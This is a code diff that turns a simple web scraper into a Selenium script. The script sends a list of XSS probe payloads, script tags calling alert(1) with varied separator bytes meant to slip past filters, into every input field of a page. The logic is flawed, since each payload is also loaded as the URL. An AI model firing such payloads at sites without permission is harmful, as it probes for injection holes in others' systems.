@@ -1,22 +1,29 @@
-from threading import Thread 
-from URLSearchParams import URLSearchParams
-from lxml import etree
+from concurrent.futures import ProcessPoolExecutor
 
 
-def webscrap(url):
-    import requests 
-    from bs4 import BeautifulSoup
-    content = requests.get(url)
-    html_content = content.content
-    soup = BeautifulSoup(html_content,'html.parser')
-    print(soup.prettify())
-    dom = etree.HTML(str(soup))
-    print(dom.xpath('/html/body/div[1]/div[3]/form/div[1]/div[1]/div[1]/div/div[2]/input')[0].text)
+def scrap(q):
+    from selenium import webdriver
+    driver= webdriver.Chrome("C:\\Users\\Sumit\\OneDrive\\Desktop\\chromedriver.exe")
+    driver.get(q)
+    search = driver.find_elements_by_tag_name("input")
+    for s in search:
+        s.send_keys(q)
 
+List = ['<script\x20type="text/javascript">javascript:alert(1);</script>', 
+'<script\x3Etype="text/javascript">javascript:alert(1);</script>',
+'<script\x0Dtype="text/javascript">javascript:alert(1);</script>',
+'<script\x09type="text/javascript">javascript:alert(1);</script>',
+'<script\x0Ctype="text/javascript">javascript:alert(1);</script>',
+'<script\x2Ftype="text/javascript">javascript:alert(1);</script>',
+'<script\x0Atype="text/javascript">javascript:alert(1);</script>']
 
-webscrap("https://www.google.com")
+def main():
+    
+    with ProcessPoolExecutor(max_workers = 3) as executor:
+        executor.map(scrap, List)
 
-
+if __name__ == "__main__":
+    main()
 
 
 
